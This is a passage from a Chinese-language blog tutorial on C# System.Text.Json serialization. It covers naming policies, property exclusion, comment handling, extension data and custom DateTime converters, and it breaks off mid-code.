<h3 id="对所有属性设置为-camel-大小写"><a href="#对所有属性设置为-camel-大小写" class="headerlink" title="对所有属性设置为 camel 大小写"></a>对所有属性设置为 camel 大小写</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions</span><br><span class="line">&#123;</span><br><span class="line">    PropertyNamingPolicy = JsonNamingPolicy.CamelCase</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">jsonSerializer.Serialize(user, options);</span><br></pre></td></tr></table></figure>

<h3 id="自定义名称策略"><a href="#自定义名称策略" class="headerlink" title="自定义名称策略"></a>自定义名称策略</h3><p>&emsp;&emsp;比如我们的系统，目前采用全小写的模式，那么我可以自定义一个转换器，并应用到序列化行为中。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LowerCaseNamingPolicy</span> : <span class="title">JsonNamingPolicy</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">string</span> <span class="title">ConvertName</span>(<span class="params"><span class="keyword">string</span> name</span>)</span> =&gt; name.ToLower();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions();</span><br><span class="line"><span class="comment">// 应用策略</span></span><br><span class="line">options.PropertyNamingPolicy = <span class="keyword">new</span> LowerCaseNamingPolicy();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, options);</span><br></pre></td></tr></table></figure>

<h3 id="将枚举序列化为名称字符串而不是数值"><a href="#将枚举序列化为名称字符串而不是数值" class="headerlink" title="将枚举序列化为名称字符串而不是数值"></a>将枚举序列化为名称字符串而不是数值</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions();</span><br><span class="line"><span class="comment">// 添加转换器</span></span><br><span class="line">options.Converters.Add(<span class="keyword">new</span> JsonStringEnumConverter());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, options);</span><br></pre></td></tr></table></figure>

<h2 id="排除不需要序列化的属性"><a href="#排除不需要序列化的属性" class="headerlink" title="排除不需要序列化的属性"></a>排除不需要序列化的属性</h2><p>&emsp;&emsp;在默认情况下，所有公共属性将被序列化为 JSON。但是，如果你不想让某些属性出现在 JSON 中，可以通过下面的几种方式实现属性排除。</p>
<h3 id="排除所有属性值为-null-属性"><a href="#排除所有属性值为-null-属性" class="headerlink" title="排除所有属性值为 null 属性"></a>排除所有属性值为 null 属性</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions();</span><br><span class="line">options.Encoder = JavaScriptEncoder.UnsafeRelaxedJsonEscaping;</span><br><span class="line">options.IgnoreNullValues = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span>, Remark = <span class="literal">null</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, options);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出，可以看到，Remark 属性被排除</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Ron"</span>,<span class="string">"Money"</span>:<span class="number">4.5</span>,<span class="string">"Age"</span>:<span class="number">30</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="排除指定标记属性"><a href="#排除指定标记属性" class="headerlink" title="排除指定标记属性"></a>排除指定标记属性</h3><p>&emsp;&emsp;可以为某个属性应用 JsonIgnore 特性，标记为不输出到 JSON。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">JsonPropertyName(<span class="meta-string">"name"</span>)</span>] <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">decimal</span> Money &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    [<span class="meta">JsonIgnore</span>]<span class="keyword">public</span> <span class="keyword">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Remark &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span>, Remark =<span class="literal">null</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出，属性 Age  已被排除</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Ron"</span>,<span class="string">"Money"</span>:<span class="number">4.5</span>,<span class="string">"Remark"</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="排除所有只读属性"><a href="#排除所有只读属性" class="headerlink" title="排除所有只读属性"></a>排除所有只读属性</h3><p>&emsp;&emsp;还可以选择对所有只读属性进行排查输出 JSON，比如下面的代码，Password 是不需要输出的，那么我们只需要将 Password 设置为 getter，并应用 IgnoreReadOnlyProperties = true 即可。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">JsonPropertyName(<span class="meta-string">"name"</span>)</span>] <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">decimal</span> Money &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    [<span class="meta">JsonIgnore</span>] <span class="keyword">public</span> <span class="keyword">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Password &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Remark &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions</span><br><span class="line">&#123;</span><br><span class="line">    IgnoreReadOnlyProperties = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span>, Remark = <span class="literal">null</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, options);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Ron"</span>,<span class="string">"Money"</span>:<span class="number">4.5</span>,<span class="string">"Remark"</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="排除派生类的属性"><a href="#排除派生类的属性" class="headerlink" title="排除派生类的属性"></a>排除派生类的属性</h3><p>&emsp;&emsp;在某些情况下，由于业务需求的不同，需要实现实体对象的继承，但是在输出 JSON 的时候，希望只输出基类的属性，而不要输出派生类型的属性，以避免产生不可控制的数据泄露问题；那么，我们可以采用下面的序列化设置。比如下面的 UserInfoExtension 派生自 UserInfo，并扩展了一个属性为身份证的属性，在输出 JSON 的时候，我们希望不要序列化派生类，那么我们可以在 Serialize 序列化的时候，指定序列化的类型为基类：UserInfo，即可达到隐藏派生类属性的目的。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">JsonPropertyName(<span class="meta-string">"name"</span>)</span>] <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">decimal</span> Money &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    [<span class="meta">JsonIgnore</span>] <span class="keyword">public</span> <span class="keyword">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Password &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Remark &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfoExtension</span> : <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> IdCard &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfoExtension &#123; Name = <span class="string">"Ron"</span>, Money = <span class="number">4.5</span>m, Age = <span class="number">30</span>, Remark = <span class="literal">null</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, <span class="keyword">typeof</span>(UserInfo));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Ron"</span>,<span class="string">"Money"</span>:<span class="number">4.5</span>,<span class="string">"Password"</span>:<span class="number">0</span>,<span class="string">"Remark"</span>:<span class="literal">null</span>&#125;</span><br></pre></td></tr></table></figure>

<h3 id="仅输出指定属性（排除属性的逆向操作）"><a href="#仅输出指定属性（排除属性的逆向操作）" class="headerlink" title="仅输出指定属性（排除属性的逆向操作）"></a>仅输出指定属性（排除属性的逆向操作）</h3><p>&emsp;&emsp;在 Newtonsoft.Json 中，我们可以通过指定 MemberSerialization 和 JsonProperty 来实现输出指定属性到 JSON 中，比如下面的代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Newtonsoft.Json.JsonObject(Newtonsoft.Json.MemberSerialization.OptIn)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Newtonsoft.Json.JsonProperty(<span class="meta-string">"name"</span>)</span>] <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo() &#123; Age = <span class="number">18</span>, Name = <span class="string">"Ron"</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> json = Newtonsoft.Json.JsonConvert.SerializeObject(user);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"Ron"</span>&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;不过，很遗憾的告诉大家，目前 System.Text.Json 不支持这种方式；为此，我特意去看了 corefx 的 issue，我看到了下面这个反馈：</p>
<figure class="image-box">
                <img src="2.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;现在确定方向了，当 .NETCore 合并到主分支 .NET 也就是 .NET5.0 的时候，官方将提供支持，在此之前，还是使用推荐 Newtonsoft.Json 。</p>
<h3 id="在反序列化的时候，允许-JSON-文本包含注释"><a href="#在反序列化的时候，允许-JSON-文本包含注释" class="headerlink" title="在反序列化的时候，允许 JSON 文本包含注释"></a>在反序列化的时候，允许 JSON 文本包含注释</h3><p>&emsp;&emsp;默认情况下，System.Text.JSON 不支持源 JSON 文本包含注释，比如下面的代码，当你不使用 ReadCommentHandling = JsonCommentHandling.Skip 的设置的时候，将抛出异常，因为在字段 Age 的后面有注释 /* age */。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jsonText = <span class="string">"&#123;\"Name\":\"Ron\",\"Money\":4.5,\"Age\":30/* age */&#125;"</span>;</span><br><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions</span><br><span class="line">&#123;</span><br><span class="line">    ReadCommentHandling = JsonCommentHandling.Skip,</span><br><span class="line">    AllowTrailingCommas = <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> user = JsonSerializer.Deserialize&lt;UserInfoExtension&gt;(jsonText);</span><br></pre></td></tr></table></figure>

<h3 id="允许字段溢出"><a href="#允许字段溢出" class="headerlink" title="允许字段溢出"></a>允许字段溢出</h3><p>&emsp;&emsp;在接口数据出现变动时，极有可能出现源 JSON 文本和实体对象属性不匹配的问题，JSON 中可能会多出一些实体对象不存在的属性，这种情况我们称之为“溢出”，在默认情况下，溢出的属性将被忽略，如果希望捕获这些“溢出”的属性，可以在实体对象中声明一个类型为：Dictionary 的属性，并对其应用特性标记：JsonExtensionData。<br>&emsp;&emsp;为了演示这种特殊的处理，我们声明了一个实体对象 UserInfo，并构造了一个 JSON 源，该 JSON 源包含了一个 UserInfo 不存在的属性：Money，预期该 Money 属性将被反序列化到属性 ExtensionData 中。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UserInfo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    [<span class="meta">JsonExtensionData</span>] <span class="keyword">public</span> Dictionary&lt;<span class="keyword">string</span>, <span class="keyword">object</span>&gt; ExtensionData &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> jsonText = <span class="string">"&#123;\"Name\":\"Ron\",\"Money\":4.5,\"Age\":30&#125;"</span>;</span><br><span class="line"><span class="keyword">var</span> user = JsonSerializer.Deserialize&lt;UserInfo&gt;(jsonText);</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="3.webp" alt="输出截图" title class>
                <p>输出截图</p>
            </figure>

<p>&emsp;&emsp;有意思的是，被特性 JsonExtensionData 标记的属性，在序列化为 JSON 的时候，他又会将 ExtensionData 的字典都序列化为单个 JSON 的属性，这里不再演示，留给大家去体验。</p>
<h2 id="转换器"><a href="#转换器" class="headerlink" title="转换器"></a>转换器</h2><p>&emsp;&emsp;System.Text.Json 内置了各种丰富的类型转换器，这些默认的转换器在程序初始化 JsonSerializerOptions 的时候就默认加载，在 JsonSerializerOptions 内部，维护着一个私有静态成员 s_defaultSimpleConverters，同时还有一个公有属性 Converters ，Converters 属性在 JsonSerializerOptions 的构造函数中被初始化；从下面的代码中可以看到，默认转换器集合和公有转换器集是相互独立的，System.Text.Json 允许开发人员通过 Converters 添加自定义的转换器。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">JsonSerializerOptions</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// The global list of built-in simple converters.</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> Dictionary&lt;Type, JsonConverter&gt; s_defaultSimpleConverters = GetDefaultSimpleConverters();</span><br><span class="line">    <span class="comment">// The global list of built-in converters that override CanConvert().</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> List&lt;JsonConverter&gt; s_defaultFactoryConverters = GetDefaultConverters();</span><br><span class="line">    <span class="comment">// The cached converters (custom or built-in).</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ConcurrentDictionary&lt;Type, JsonConverter&gt; _converters = <span class="keyword">new</span> ConcurrentDictionary&lt;Type, JsonConverter&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Dictionary&lt;Type, JsonConverter&gt; <span class="title">GetDefaultSimpleConverters</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;JsonConverter&gt; <span class="title">GetDefaultConverters</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">       ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> IList&lt;JsonConverter&gt; Converters &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="内置转换器"><a href="#内置转换器" class="headerlink" title="内置转换器"></a>内置转换器</h3><p>&emsp;&emsp;在 System.Text.Json 内置的转换器集合中，涵盖了所有的基础数据类型，这些转换器的设计非常精妙，他们通过注册一系列的类型映射，在通过 Utf8JsonWriter / Utf8JsonReader 的内置方法 GetTypeValue / TryGetTypeValue 方法得到值，代码非常精练，复用性非常高，下面是内置类型转换器：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> IEnumerable&lt;JsonConverter&gt; DefaultSimpleConverters</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">get</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// When adding to this, update NumberOfSimpleConverters above.</span></span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterBoolean</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterByte</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterByteArray</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterChar</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterDateTime</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterDateTimeOffset</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterDouble</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterDecimal</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterGuid</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterInt16</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterInt32</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterInt64</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterJsonElement</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterObject</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterSByte</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterSingle</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterString</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterUInt16</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterUInt32</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterUInt64</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">yield</span> return new <span class="title">JsonConverterUri</span>(<span class="params"></span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="自定义类型转换器"><a href="#自定义类型转换器" class="headerlink" title="自定义类型转换器"></a>自定义类型转换器</h3><p>&emsp;&emsp;虽然 System.Text.Json 内置了各种各样丰富的类型转换器，但是在各种业务开发的过程中，总会根据业务需求来决定一些特殊的数据类型的数据，下面，我们就以经典的日期/时间转换作为演示场景。<br>&emsp;&emsp;我们需要将日期类型输出为 Unix 时间戳而不是格式化的日期内容，为此，我们将实现一个自定义的时间格式转换器，该转换器继承自 JsonConverter。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class JsonConverterUnixDateTime : JsonConverter&lt;DateTime&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> DateTime Greenwich_Mean_Time = TimeZoneInfo.ConvertTime(<span class="keyword">new</span> DateTime(<span class="number">1970</span>, <span class="number">1</span>, <span class="number">1</span>), TimeZoneInfo.Local);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="keyword">int</span> Limit = <span class="number">10000</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> DateTime <span class="title">Read</span>(<span class="params"><span class="keyword">ref</span> Utf8JsonReader reader, Type typeToConvert, JsonSerializerOptions options</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (reader.TokenType == JsonTokenType.Number)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> unixTime = reader.GetInt64();</span><br><span class="line">            <span class="keyword">var</span> dt = <span class="keyword">new</span> DateTime(Greenwich_Mean_Time.Ticks + unixTime * Limit);</span><br><span class="line">            <span class="keyword">return</span> dt;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> reader.GetDateTime();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Write</span>(<span class="params">Utf8JsonWriter writer, DateTime <span class="keyword">value</span>, JsonSerializerOptions options</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> unixTime = (<span class="keyword">value</span> - Greenwich_Mean_Time).Ticks / Limit;</span><br><span class="line">        writer.WriteNumberValue(unixTime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="应用自定义的时间转换器"><a href="#应用自定义的时间转换器" class="headerlink" title="应用自定义的时间转换器"></a>应用自定义的时间转换器</h3><p>&emsp;&emsp;转换器的应用形式有两种，分别是将转换加入 JsonSerializerOptions.Converters 和给需要转换的属性添加特性标记 JsonConverter。</p>
<h4 id="加入Converters-方式"><a href="#加入Converters-方式" class="headerlink" title="加入Converters 方式"></a>加入Converters 方式</h4><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> options = <span class="keyword">new</span> JsonSerializerOptions();</span><br><span class="line">options.Converters.Add(<span class="keyword">new</span> JsonConverterUnixDateTime());</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> UserInfo() &#123; Age = <span class="number">30</span>, Name = <span class="string">"Ron"</span>, LoginTime = DateTime.Now &#125;;</span><br><span class="line"><span class="keyword">var</span> json = JsonSerializer.Serialize(user, options);</span><br><span class="line"><span class="keyword">var</span> deUser = 